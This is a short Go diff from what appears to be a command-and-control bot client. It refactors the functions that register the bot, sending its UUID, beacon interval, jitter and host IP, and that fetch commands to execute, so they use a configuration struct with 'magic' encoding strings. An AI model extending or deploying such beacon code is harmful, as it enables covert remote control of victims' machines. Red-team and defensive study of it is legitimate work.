@@ -7,21 +7,21 @@ import (
 )
 
 //register the bot with the DB
-func register() string {
+func register(m Metclient) string {
 	uid := uuid.New().String()
-	storeUUID(uid)
+	storeUUID(uid, m)
 	hn := getIP()
-	intrv := strconv.Itoa(INTERVAL)
-	dlt := strconv.Itoa(DELTA)
+	intrv := strconv.Itoa(m.interval)
+	dlt := strconv.Itoa(m.delta)
 	payload := uid + "||" + intrv + "||" + dlt + "||" + hn
-	ret := sendData(payload, "C", "0")
+	ret := encodePayload(payload, "C", "0", m.magicstring, m.magictermstr)
 	return ret
 }
 
 //pull all commands to be executed
-func getCommand() {
-	uid := fetchUUID()
-	coms := encodePayload(uid, "D", "0")
+func getCommand(m Metclient) {
+	uid := fetchUUID(m)
+	coms := encodePayload(uid, "D", "0", m.magicstring, m.magictermstr)
 	results := parseCommands(coms)
 	if results == nil {
 		return
